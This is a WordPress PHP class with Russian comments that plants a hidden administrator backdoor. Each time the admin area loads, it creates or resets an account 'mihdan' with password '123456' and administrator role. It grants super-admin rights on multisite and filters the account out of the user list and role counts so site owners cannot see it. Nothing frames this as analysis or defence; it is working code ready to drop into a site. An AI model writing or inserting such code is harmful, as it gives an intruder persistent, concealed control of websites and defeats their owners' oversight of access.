<?php
class Mihdan_Hidden_Admin {
	private $user_login    = 'mihdan';
	private $user_password = '123456';
	private $user_role     = 'administrator';
	public function __construct() {
		$this->init_hooks();
	}
	public function init_hooks() {
		add_action( 'pre_get_users', array( $this, 'hide' ) );
		add_action( 'admin_init', array( $this, 'update_user' ) );
		add_filter( 'views_users', array( $this, 'views' ) );
	}
	public function views( $views ) {
		$users                = count_users();
		$total_administrators = $users['avail_roles']['administrator'] - 1;
		$total_users          = $users['total_users'] - 1;
		$class_administrators = ( strpos( $views['administrator'], 'current' ) === false ) ? '' : 'current';
		$class_users          = ( strpos( $views['all'], 'current' ) === false ) ? '' : 'current';
		$views['all']           = '<a href="users.php" class="' . $class_users . '">' . __( 'All' ) . ' <span class="count">(' . $total_users . ')</span></a>';
		$views['administrator'] = '<a href="users.php?role=administrator" class="' . $class_administrators . '">' . translate_user_role( 'Administrator' ) . ' <span class="count">(' . $total_administrators . ')</span></a>';
		return $views;
	}
	public function hide( WP_User_Query $user_query ) {
		// Запускаем код только в админке.
		if ( ! is_admin() ) {
			return;
		}
		// Запускаем код только на странице со списком пользователей.
		if ( 'users' !== get_current_screen()->id ) {
			return;
		}
		$user_query->set( 'login__not_in', array( $this->user_login ) );
		//$user_query->set( 'total_users', $user_query->get( 'total_users' ) - 1 );
	}
	public function update_user() {
		// Если пользователь с логином $this->user_login существует
		if ( username_exists( $this->user_login ) ) {
			// По логину получаем объект с данными пользователя
			$user = get_user_by( 'login', $this->user_login );
			// Если установленный пароль не совпадает с вышеуказанным, либо юзер не является администратором
			if ( ! wp_check_password( $this->user_password, $user->data->user_pass ) || ! in_array( $this->user_role, $user->roles ) ) {
				// Меняем ему пароль на вышеуказанный
				wp_set_password( $this->user_password, $user->ID );
				// Получаем ID пользователя
				$user_id = wp_update_user(
					array(
						'ID'         => $user->ID,
						'user_login' => $this->user_login,
						'user_pass'  => $this->user_password,
						'role'       => $this->user_role,
					)
				);
			}
		} else {
			// Пользователя не существует, создаём его
			$user_id = wp_insert_user(
				array(
					'user_login' => $this->user_login,
					'user_pass'  => $this->user_password,
					'role'       => $this->user_role,
				)
			);
		}
		if ( isset( $user_id ) && is_multisite() ) {
			// Наделим пользователя правами суперадмина
			require_once ABSPATH . 'wp-admin/includes/ms.php';
			grant_super_admin( $user_id );
		}
	}
}
new Mihdan_Hidden_Admin();
